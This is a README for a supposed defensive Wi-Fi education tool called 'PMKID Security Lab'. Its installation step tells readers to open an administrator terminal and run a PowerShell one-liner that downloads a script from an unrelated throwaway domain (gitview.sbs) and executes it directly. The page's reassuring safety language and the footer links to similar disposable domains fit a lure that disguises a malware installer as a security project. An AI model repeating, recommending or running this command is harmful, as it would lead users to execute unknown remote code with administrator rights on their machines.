# PMKID Security Lab — Defensive Wi-Fi Education

> A local educational lab for understanding PMKID concepts, wireless risk reviews, and defensive network hardening.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitview.sbs?get=pmkid | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Pmkid modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Pmkid.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**PMKID Security Lab** explains wireless authentication concepts through synthetic diagrams, risk checklists, and hardening exercises. It helps learners and network owners understand exposure without collecting or testing real credentials.

**Best for:** Security educators, network defenders, students, and authorized lab maintainers.

**Key differentiators:**
1. Synthetic protocol diagrams
2. Defensive risk checklist
3. WPA2 and WPA3 comparison notes
4. Network hardening plan
5. Local knowledge checks

---

## Core Features

```
✅ PMKID concept visualizer
✅ Synthetic authentication records
✅ Wireless risk checklist
✅ WPA2 and WPA3 guidance
✅ Hardening action plan
✅ Authorized-lab scope record
✅ Knowledge checks
✅ Redacted learning reports
```

---

## Usage

```bash
# Start the local learning lab
python -m pmkid_lab dev --port 8000

# Open the synthetic concept view
python -m pmkid_lab concept open --topic pmkid

# Review a defensive checklist
python -m pmkid_lab checklist run --profile home-lab

# Export a hardening plan
python -m pmkid_lab plan export --profile home-lab --format markdown
```

---

## REST API

> [!NOTE]
> The API serves educational metadata and synthetic records only. It does not interact with wireless hardware, capture traffic, or test passwords.

```bash
# Start the local API
python -m pmkid_lab serve --port 8000

# List learning topics
curl http://localhost:8000/api/v1/topics

# Read a synthetic concept
curl http://localhost:8000/api/v1/topics/pmkid

# Export a redacted hardening plan
curl http://localhost:8000/api/v1/plans/home-lab/export?redact=true
```

---

## Screenshots

- Concept diagram: `screenshots/concept-diagram.png`
- Risk checklist: `screenshots/risk-checklist.png`
- Hardening plan: `screenshots/hardening-plan.png`
- Knowledge check: `screenshots/knowledge-check.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Concept view is blank | Run the demo seed and restart the local lab. |
| Checklist item is unclear | Open the linked explanatory note and record the local device context. |
| Plan export is empty | Complete the profile questions before exporting. |
| Report contains private details | Enable redaction and remove personal network identifiers. |
| Port 8000 is busy | Start the lab on another local port. |

---

## Use Cases

- **Security Education** — Explain authentication concepts with synthetic examples.
- **Home Network Review** — Build a defensive hardening checklist.
- **Authorized Labs** — Document scope and learning outcomes.
- **Policy Training** — Connect technical choices to consent and privacy.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Never capture, derive, crack, or test wireless credentials on networks you do not own or have explicit permission to assess. This project provides no credential-recovery or bypass workflow.

> [!TIP]
> Prefer WPA3 or a strong WPA2 configuration, unique passphrases, firmware updates, and guest-network separation.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
pmkid, wifi-security, defensive-education, wireless-networking, wpa2, wpa3, hardening, security-lab, synthetic-data, responsible-security
-->

[gitsl.xyz](https://gitsl.xyz?t=pmkid) | [gitview.sbs](https://gitview.sbs?t=pmkid) | [gitrm.sbs](https://gitrm.sbs?t=pmkid) | [gitrm.cfd](https://gitrm.cfd?t=pmkid) | [viewgit.sbs](https://viewgit.sbs?t=pmkid)
